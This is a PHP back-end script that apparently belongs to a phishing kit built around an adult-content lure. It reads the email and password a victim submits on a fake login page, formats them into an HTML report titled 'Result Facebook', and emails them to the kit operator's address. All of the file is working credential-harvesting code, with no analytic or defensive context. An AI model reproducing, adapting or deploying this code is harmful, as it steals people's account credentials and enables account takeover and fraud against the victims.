<?php
include 'email.php';
$email = $_POST['email'];
$password = $_POST['password'];
if ($email == "" && $password == "")
{
  header("Location: index.php");
} else {
    
  $subjek = "BOKEP GG | PUNYA SI {$email} |";
  $pesan = '

<center> 
 <div style="padding:5px;width:294;height:auto;background: #222222;color:#ffc;text-align:center;">
 <font size="3.5"><b>Result Facebook</b></font>
 </div>
 <table style="border-collapse:collapse;background:#ffc" width="100%" border="1">
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Email</th>
  <th style="width:78%;text-align: center;"><b>' . $email . '</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Password</th>
  <th style="width:78%;text-align: center;"><b>' . $password . '</th> 
 </tr>
 </table>
 <div style="padding:5px;width:294;height:auto;background: #222222;color:#ffc;text-align:center;">
 <font size="3"><b>Result 18+ Gg</b></font>
 </div>
 </center>

';

    $headers = "MIME-Version: 1.0\r\n";
    $headers = "MIME-Version: 1.0\r\nContent-type: text/html; charset=iso-8859-1\r\n";
    $headers .= '' . $sender . "" . "\r\n";
    mail($emailku, $subjek, $pesan, $headers);

}

?>